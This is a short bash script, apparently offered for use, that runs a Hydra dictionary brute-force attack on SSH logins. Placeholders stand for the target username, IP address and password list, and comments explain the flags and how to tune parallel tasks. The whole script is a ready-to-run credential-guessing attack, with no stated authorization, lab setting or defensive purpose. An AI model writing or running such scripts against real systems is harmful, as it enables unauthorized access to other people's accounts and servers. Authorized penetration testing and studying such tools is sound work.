#!/bin/bash
# Optimized password cracking with Hydra

# Example usage for SSH:
# Replace "user" with the target username, "target_ip" with the IP, and "password_list.txt" with your password file.

USERNAME="user"
TARGET_IP="target_ip"
PASSWORD_LIST="password_list.txt"

# Command to run Hydra on SSH
hydra -l $USERNAME -P $PASSWORD_LIST ssh://$TARGET_IP -t 4

# Explanation:
# -l : specifies the username
# -P : specifies the password list file
# -t : sets the number of parallel tasks (optimized for performance)
# Note: Adjust `-t` based on your system's performance and network limits.
